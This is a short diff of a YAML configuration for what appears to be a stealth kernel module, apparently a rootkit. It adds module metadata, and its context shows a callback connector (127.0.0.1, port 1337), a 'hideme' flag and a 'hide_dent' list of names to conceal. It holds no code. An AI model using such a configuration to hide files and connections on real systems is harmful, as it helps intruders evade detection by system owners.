@@ -1,7 +1,11 @@
-hideme: false
+module:
+    author: "Author"
+    description: "Kernel Module"
+    version: "1.0"
 connector:
     ip: "127.0.0.1"
     port: "1337"
+hideme: false
 hide_dent:
     - "91746"
     - "1337test_"
